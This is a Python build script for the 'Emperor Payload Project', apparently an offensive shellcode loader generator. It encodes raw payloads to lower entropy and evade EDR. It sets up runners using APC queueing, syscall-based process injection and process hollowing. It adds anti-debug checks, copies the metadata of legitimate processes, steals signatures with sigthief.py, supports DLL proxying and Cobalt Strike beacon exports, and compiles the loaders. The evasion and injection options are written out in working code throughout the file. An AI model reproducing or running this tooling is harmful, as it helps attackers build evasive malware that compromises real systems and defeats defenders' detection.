# Emperor Payload Project
# build.py
# this is the payload generator script, will read a binary file, obfuscate it, and 
# use the obfuscated payload and to 
# ___________                                         
# \_   _____/ _____ ______   ___________  ___________ 
#  |    __)_ /     \\____ \_/ __ \_  __ \/  _ \_  __ \
#  |        \  Y Y  \  |_> >  ___/|  | \(  <_> )  | \/
# /_______  /__|_|  /   __/ \___  >__|   \____/|__|   
#         \/      \/|__|        \/                    
#                              ..::--:....                        
    #                        .-#%%%%%%%%#*=:.......::-..           
    #                     ..=#%%%%%@@@%%%%%%###***#***+=.          
    #                    .-===##%%%%%%%#*+=--=+*--......           
    #                   .=+==+%%%%%%%%*-==*#%#:....                
    #                  .=-=+=#@@@@%%%%@@@%%%=.                     
    #                .:==::==%%@%%%%%%%%%%%:.                      
    #              .:+**=-::-=#%%%%%%%%%%*:.                       
    #           ..-*****+=------=+##%%%#-...                       
    #           .+****+++++==----===****=:..                       
    #          .*#**+++++*+++++++++==-----=-..                     
    #         .+#*+=+***####=-::--::::::::::..                     
    #         :#*=+**####+:::::::::::::::::::..                    
    #        .+*+***###+-:::::::::::::::...::..                    
    #       .-*===*##*-:..::::::::::::....:::..                    
    #       :#+=-=+#%*:...:::::::::..:::--:::..                    
    #      .*+===++%*:::..::::::::...:::::::::..                   
    #     .+*+++##*%-:::....::::::.......:::::..                   
    #     :#+++*%#**:::.....:::::::::....::::-:.                   
    #    .+#*+*#%##-:::.....:::::::::::::::::-+.                   
    #    :*****#@#=:::.....::::::::::::::::::-#+                   
    #   .=*+***#%-:::.....:::::::::::::::::::-*%-                  
    #   .+*****#=-:::::...:::::::------:---:::-+%:                 

import argparse
import subprocess
from termcolor import colored
from dictionary_encoding import *
from delta_encoding import *
from file_metadata import *

def art():
    # ascii art, the most important part!
    print()
    print(colored(" ___________                                          ", "cyan"))                                         
    print(colored(" \\_   _____/ _____ ______   ___________  ___________  ", "cyan"))
    print(colored("  |    __)_ /     \\____ \\_/ __ \\_  __ \\/  _ \\_  __ \\ ", "cyan"))
    print(colored("  |        \\  Y Y  \\  |_> >  ___/|  | \\(  <_> )  | \\/ ", "cyan"))
    print(colored(" /_______  /__|_|  /   __/ \\___  >__|   \\____/|__|    ", "cyan"))
    print(colored("         \\/      \\/|__|        \\/                     ", "cyan"))
    print(colored("""
                              ..::--:....                        
                           .-#%%%%%%%%#*=:.......::-..           
                        ..=#%%%%%@@@%%%%%%###***#***+=.          
                       .-===##%%%%%%%#*+=--=+*--......           
                      .=+==+%%%%%%%%*-==*#%#:....                
                     .=-=+=#@@@@%%%%@@@%%%=.                     
                   .:==::==%%@%%%%%%%%%%%:.                      
                 .:+**=-::-=#%%%%%%%%%%*:.                       
              ..-*****+=------=+##%%%#-...                       
              .+****+++++==----===****=:..                       
             .*#**+++++*+++++++++==-----=-..                     
            .+#*+=+***####=-::--::::::::::..                     
            :#*=+**####+:::::::::::::::::::..                    
           .+*+***###+-:::::::::::::::...::..                    
          .-*===*##*-:..::::::::::::....:::..                    
          :#+=-=+#%*:...:::::::::..:::--:::..                    
         .*+===++%*:::..::::::::...:::::::::..                   
        .+*+++##*%-:::....::::::.......:::::..                   
        :#+++*%#**:::.....:::::::::....::::-:.                   
       .+#*+*#%##-:::.....:::::::::::::::::-+.                   
       :*****#@#=:::.....::::::::::::::::::-#+                   
      .=*+***#%-:::.....:::::::::::::::::::-*%-                  
      .+*****#=-:::::...:::::::------:---:::-+%:                 
 """, "cyan"))

def main(VERBOSE = True, DEBUG_CHECK = False, RUN_ONCE_MUTEX = False,
         ENCODE_DICT = True, ENCODE_DELTA = False, 
         RUN_HEAP = True, RUN_VIRTUAL = False, RUN_APC = False, RUN_INJECT = False, RUN_HOLLOW = False,
         mutex_name = None, build_dir = "."):

    art()

    # checks to make sure settings are enabled that this will run as expected
    if not (ENCODE_DELTA or ENCODE_DICT):
        print(colored("[!] ENCODER NOT SELECTED.", "red"))
    if not (RUN_HEAP or RUN_VIRTUAL or RUN_HOLLOW or RUN_APC or RUN_INJECT):
        print(colored("[!] RUNNER NOT SELECTED.", "red"))

    # opens dictionary and payload binary file
    payload_file = open(f"{build_dir}\\payload_x64.bin", "rb")

    # reads the payload bytes into a buffer
    payload_buf  = payload_file.read()

    if ENCODE_DICT:

        encoder = dict_encoder(f"{build_dir}\\dictionary.txt")
        print(colored("[+] Read in payload and encoding dictionary...", "green"))
        
        encoder.encode_payload(payload_buf,  f"{build_dir}\\..\\src-common\\buf.h")
        print(colored("[+] Dictionary encoded payload...", "green"))

        if RUN_APC or RUN_INJECT or RUN_HOLLOW:
            encoder.encode_cmd_line(f"{build_dir}\\cmd_line.txt",  f"{build_dir}\\..\\src-common\\buf.h")

        # writes our mutex
        if mutex_name is not None:
            encoder.encode_mutex(mutex_name, f"{build_dir}\\..\\src-common\\buf.h")
        
    # using delta encoding
    elif ENCODE_DELTA:

        outfile = open(f"{build_dir}\\..\\src-common\\buf.h", "w")

        outfile.write("// size of our buffer\n")
        outfile.write("#define DATA_SIZE ")
        outfile.write(str(len(payload_buf)))
        outfile.write("\n\n// encrypted buffer\n")
        # writes the string formatted for c/c++, which is the encoded payload
        # and we call our variable "buf"
        outfile.write(format_bytes(delta_encode(payload_buf), "buf"))
        outfile.write("\n\n")
        if RUN_APC or RUN_INJECT or RUN_HOLLOW:
            cmd_file = open(f"{build_dir}\\cmd_line.txt")
            cmd_line = cmd_file.read().encode()
            outfile.write("// encrypted process\n")
            outfile.write(format_bytes(delta_encode(cmd_line), "cmd"))
            outfile.write("\n\n")
            outfile.write("// cmd size definition\n")
            outfile.write("#define CMD_LINE_SIZE ")
            outfile.write(str(len(cmd_line)))

        if mutex_name is not None:
            outfile.write("// size of our mutex name\n")
            outfile.write("#define MUTEX_NAME_SIZE ")
            outfile.write(str(len(mutex_name.encode('utf-8'))))
            outfile.write("\n\n// encrypted buffer\n")
            outfile.write(format_bytes(delta_encode(mutex_name.encode('utf-8')), "mutex_enc"))
            outfile.write("\n\n")

        print(colored("[+] Encoded using delta encoding", "green"))
        outfile.close()

    print(colored("[+] Wrote buf.h to Emperor\\src-common\\buf.h", "green"))

    # now that payload encoding is done, writes our definitions to a file
    outfile = open(f'{build_dir}\\..\\src-common\\defs.h', 'w')

    # writes the pragma once definition to the top of the file
    outfile.write("#pragma once\n\n")

    # whether or not we want to do verbose printing
    outfile.write("// define that we want to do verbose printing\n")
    if not VERBOSE:
        outfile.write("//")
    outfile.write("#define VERBOSE\n\n")

    # whether or not we want to do debug checks
    outfile.write("// define that we want to do debug checks\n")
    if not DEBUG_CHECK:
        outfile.write("//")
    outfile.write("#define DEBUG_CHECK\n\n")

    # whether or not we want to enable a mutex to not launch multiple beacons
    outfile.write("// define that we want to launch a mutex and only run once\n")
    if not RUN_ONCE_MUTEX:
        outfile.write("//")
    outfile.write("#define RUN_ONCE_MUTEX\n\n")

    # defines which runner to use
    if RUN_VIRTUAL:
        outfile.write("// run using a self-runner with NtAllocateVirtualMemory as the allocator\n")
        outfile.write("#define RUN_VIRTUAL\n\n")
    elif RUN_APC:
        outfile.write("// run using an auto migrator using remote apc queueing as the method\n")
        outfile.write("#define RUN_APC\n\n")
    elif RUN_INJECT:
        outfile.write("// run using an auto migrator using process injection as the method (via syscalls)\n")
        outfile.write("#define RUN_INJECT\n\n")
    elif RUN_HOLLOW:
        outfile.write("// run using an auto migrator using process hollowing as the method\n")
        outfile.write("#define RUN_HOLLOW\n\n")
    else:
        outfile.write("// run using a self runner with HeapAlloc as the allocator\n")
        outfile.write("#define RUN_HEAP\n\n")

    # defines which encoding we are using
    if ENCODE_DELTA:
        outfile.write("// encrypting your payload using delta encoding\n")
        outfile.write("#define ENCODE_DELTA\n\n")
    else:
        outfile.write("// encoding your payload using dictionary words\n")
        outfile.write("#define ENCODE_DICT\n\n")

    outfile.close()

    print(colored("[+] Wrote defs.h to Emperor\\src-common\\defs.h", "green"))

if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description='Used for encoding shellcode and writing to buf.h and \n \
        writing optional arguments and writing to defs.h in src-common. This \
        is meant to increase the ease of use for compiling Emperor on the fly.', add_help=True)

    parser.add_argument('--Encode-Delta', action="store_true",
    help='By default we encode with dictionary encoding. The rationale here is that \
        EDR can trigger on binaries with high entropy, and high entropy in a given section.\
        Encoding with dictionary words allows us to drastically lower our entropy. This parameter \
        is included in case you really want to keep file size down as much as possible, you have an option.')

    parser.add_argument('--Run-Virtual', action="store_true",
    help='By defualt we load the shellcode into our own process using HeapAlloc as the allocator.\
        This switch will configure the payload to load the shellcode into its own process using \
        the indirect randomized syscall NtAllocateVirtualMemory as the allocator. This is the more \
        stealthy way to do this more old school method.')

    parser.add_argument('--Run-APC', action="store", type=str,
    help='Usage: --Run-APC C:\\Windows\\System32\\legitimate_process.exe \n\n \
        This will configure the shellcode runner to inject into a child process by queuing a \
        remote asynchronous procedure call (APC). You map the shellcode into your own process using syscalls \
        and then have the child process created write a section of memory into its process based off \
        of what you just mapped to the yours. Then we queue an APC to run the shellcode. I have not yet \
        figured out how to get this to run without using RWX permissions, which is potentially an OPSEC issue.\n')

    parser.add_argument('--Run-Inject', action="store", type=str,
    help='Usage: --Run-Inject C:\\Windows\\System32\\legitimate_process.exe \n\n \
        This will configure the shellcode runner to inject into a child process using a more traditional \
        injection method. We allocate memory in the child with NtAllocateVirtualMemory, write memory with \
        NtWriteProcessMemory, and create a thread in it with NtCreateThread. This is all done using syswhispers3\'s \
        indirect and randomized syscalls.\n')

    parser.add_argument('--Run-Hollow', action="store", type=str,
    help='Usage: --Run-Hollow C:\\Windows\\System32\\legitimate_process.exe \n\n \
        This will configure the shellocde runner to run a process hollowing implementation. Keep in mind that \
        process hollowing (while probably the stealthiest migration technique) will only work if the \
        entry point of the child process to the end of the process\' memory is larger than or equal to your \
        shellcode size. With Cobalt Strike.... this is... not usually the case. Very few processes are big \
        enough to take a stageless beacon and it shows no signs of getting smaller.\n')

    parser.add_argument('--Verbose', action="store_true",
    help='Defines whether or not we want verbose statements. This might evade EDR if a given runner is being \
        caught in a pinch, as printf statements can break up the signature. But given that you\'re printing facts \
        about payload execution, this is meant for debugging code changes.')
    
    parser.add_argument('--Debug-Check', action="store_true",
    help='Performs debug checks from the article: https://anti-debug.checkpoint.com/techniques/interactive.html. \
        This will check to see if the process is being debugged, and quit the process if it is.')
    
    parser.add_argument('--Run-Once-Mutex', action="store", type=str,
    help='Usage: --Run-Once-Mutex "emperor mutex" \n\n \
        When this switch is set, the script will configure the payload to launch a mutex on start. \
        While the mutex is active, subsequent launches of the payload will not launch. This will not pair \
        eleantly with auto migration tequniques because since your original process isn\'t running, this will not \
        still be active and subsequent processes can launch without the mutex to worry about. Pass in the mutex name \
        for this switch." ')
    
    parser.add_argument('--Mimic-Process', action="store", type=str,
    help='Usage: --Mimic-Process C:\\Windows\\Explorer.exe \n\n \
        This switch will grab metadata such as strings (for dictionary encoding), \
        some decoy code (used if --Debug-Check is on) and general metadata for the resouce file. \
        If we end up with less than 256 unique words, we\'ll grab the rest from our backup penguin \
        dictionary. Make sure to test this, some processes play better than others')
    
    parser.add_argument('--Steal-Sig',action="store_true",
    help="This switch will allow you to run sigthief.py and steal the signature of the process \
        you are mimicing. The signature will not be valid, but it will be filled in. If you \
        have this switch active and the Mimic Process switch is not active, this will be ignored." )
    
    parser.add_argument('--StartW',action="store", type=str,
    help="Usage: --StartW ProcessDiagnostics \n\n\
        This switch overwrites the default \"StartW\" function in the dll. StartW is the default exported \
        Function in Cobalt Strike Dll's that are used to wait for the DllMain thread to kick off. Basically, \
        this is the function you will call when you run this dll from rundll32.exe. The default is \"ProcessDiagnostics\"." )

    parser.add_argument('--Svc-Name',action="store", type=str,
    help="Usage: --Svc-Name WinCriticalSvc \n\n \
        This switch will allow you to change the name of the service that is defined in svcmain.h.\
        This is used for communicating with the service controller and could potentially get signatured over time.\
        The default is WinCriticalSvc" )
    
    parser.add_argument('--Dll-Proxy', action="store", type=str,
    help="Usage: --Dll-Proxy C:\\Windows\\System32\\bcrypt.dll \n\n \
        This switch is used to grab exports from a dll specified and automatically add them to your dll's def file.\
        BEWARE that if you do this, you may not be able to execute the dll outside of a proxying context!")


    args = parser.parse_args()        

    # This dynamically figures out where the the build directory is. Allowing for the project to be build from the root of the project dir.
    build_dir = "\\".join(__file__.split("\\")[:-1])

    ENCODE_DICT = True
    ENCODE_DELTA = False
    if args.Encode_Delta:
        print(colored("[+] Performing Delta Encoding...", "green"))
        ENCODE_DICT = False
        ENCODE_DELTA = True
    else:
        print(colored("[+] Performing Dictionary Encoding...", "green"))

    RUN_HEAP = True
    RUN_VIRTUAL = False
    RUN_APC = False
    RUN_INJECT = False
    RUN_HOLLOW = False
    if args.Run_Virtual:
        RUN_HEAP = False
        RUN_VIRTUAL = True
        print(colored("[+] Setting the payload to run with NtAllocateVirtualMemory as the allocator...", "green"))
    elif args.Run_APC:
        RUN_HEAP = False
        RUN_APC = True
        print(colored("[+] Setting the payload to run queuing a remote asynchronous procedure call (APC)...", "green"))
        outfile = open(f"{build_dir}\\cmd_line.txt", "w")
        outfile.write(args.Run_APC)
        outfile.close()
    elif args.Run_Inject:
        RUN_HEAP = False
        RUN_INJECT = True
        print(colored("[+] Setting the payload to run with process injection via indirect randomized syscalls...", "green"))
        outfile = open(f"{build_dir}\\cmd_line.txt", "w")
        outfile.write(args.Run_Inject)
        outfile.close()
    elif args.Run_Hollow:
        RUN_HEAP = False
        RUN_HOLLOW = True
        print(colored("[+] Setting the payload to run via process hollowing...", "green"))
        outfile = open(f"{build_dir}\\cmd_line.txt", "w")
        outfile.write(args.Run_Hollow)
        outfile.close()
    else:
        print(colored("[+] Setting the payload to run with HeapAlloc as the allocator...", "green"))

    RUN_ONCE_MUTEX = False
    if args.Run_Once_Mutex:
        RUN_ONCE_MUTEX = True

    # if we want to gather file metadata, runs it before encoding anything specific
    if args.Mimic_Process:
        get_strings(args.Mimic_Process, n=10, build_dir=build_dir)
        get_resource(args.Mimic_Process, build_dir)


    # if we want to set the service name to something specific, we do that here
    if args.Svc_Name:
        outfile = open(f"{build_dir}\\..\\src-main\\svcmain.h", "w")
        outfile.write("// this could be signatured at some point\n")
        outfile.write('#define SERVICE_NAME L"WinCriticalSvc"\n')
        outfile.close()

    # if we are not proxying a dll and we are chaging our start function
    if args.StartW and not args.Dll_Proxy:
        outfile = open(f"{build_dir}\\..\\EmperorDll\\def.def", "w")
        outfile.write("EXPORTS\n")
        outfile.write("DllMain\n")
        outfile.write(args.StartW+"\n")
    elif args.Dll_Proxy:
        dll_proxy(args.Dll_Proxy, args.StartW, f"{build_dir}\\..\\EmperorDll\\def.def")

    # writes the actual code for our StartW function
    if args.StartW:
        outfile = open(f"{build_dir}\\..\\src-main\\dllmain.h", "w")
        outfile.write("/* rundll32.exe entry point ProcessDiagnostic */\n")
        outfile.write(f"void CALLBACK {args.StartW}(HWND hwnd, HINSTANCE hinst, LPWSTR lpszCmdLine, int nCmdShow) ""{\n")
        outfile.write("\twhile (TRUE)\n")
        outfile.write("\t\tWaitForSingleObject(GetCurrentProcess(), 60000);\n")
        outfile.write("}")
        outfile.close()

    main(args.Verbose, args.Debug_Check, RUN_ONCE_MUTEX, ENCODE_DICT, ENCODE_DELTA,
         RUN_HEAP, RUN_VIRTUAL, RUN_APC, RUN_INJECT, RUN_HOLLOW, args.Run_Once_Mutex, build_dir)

    print(colored("[+] Beginning compilation. This may take a while...", "green"))
    compilation_out = subprocess.run(f'cd {build_dir}\\.. && \
    "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe" -t:Rebuild -p:Configuration=Release', 
                   capture_output=True, shell=True)
    compilation_debug = subprocess.run(f'cd {build_dir}\\.. && \
    "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\MSBuild\\Current\\Bin\\MSBuild.exe" -t:Rebuild -p:Configuration=Debug', 
                   capture_output=True, shell=True)
    if "0 Error(s)" in compilation_out.stdout.decode('utf-8') and "0 Error(s)" in compilation_debug.stdout.decode('utf-8'):
        print(colored("[+] Compilation finished with no errors!", "green"))
    else:
        print(colored("[!] Compilation finished with errors. Printing output: \n", "red"))
        print(compilation_out.stdout.decode('utf-8'))

    if args.Mimic_Process and args.Steal_Sig:
        # exe
        print(colored("[+] Attempting to steal a file signature for exe.", "green"))
        subprocess.run(f"del {build_dir}\\..\\x64\\Release\\Emperor_signed.exe", shell = True, capture_output=True)
        subprocess.run(f'python {build_dir}\\sigthief.py -i {args.Mimic_Process} -t {build_dir}\\..\\x64\\Release\\Emperor.exe -o {build_dir}\\..\\x64\\Release\\Emperor_signed.exe',
            shell=True)
        subprocess.run(f'del {build_dir}\\..\\x64\\Release\\Emperor.exe', shell=True)
        subprocess.run(f'cd {build_dir}\\..\\x64\\Release && ren Emperor_signed.exe Emperor.exe', shell = True)

        # dll
        print(colored("[+] File signature stealing not supported for dlls.", "green"))

        # service
        print(colored("[+] Attempting to steal a file signature for service exe.", "green"))
        subprocess.run(f"del {build_dir}\\..\\x64\\Release\\EmperorSvc_signed.exe", shell = True, capture_output=True)
        subprocess.run(f'python {build_dir}\\sigthief.py -i {args.Mimic_Process} -t {build_dir}\\..\\x64\\Release\\EmperorSvc.exe -o {build_dir}\\..\\x64\\Release\\EmperorSvc_signed.exe',
            shell=True)
        subprocess.run(f'del {build_dir}\\..\\x64\\Release\\EmperorSvc.exe', shell=True)
        subprocess.run(f'cd {build_dir}\\..\\x64\\Release && ren EmperorSvc_signed.exe EmperorSvc.exe', shell = True)

        print(colored("[+] Outputed files to Emperor\\x64\\Debug and Emperor\\x64\\Release!", "cyan"))

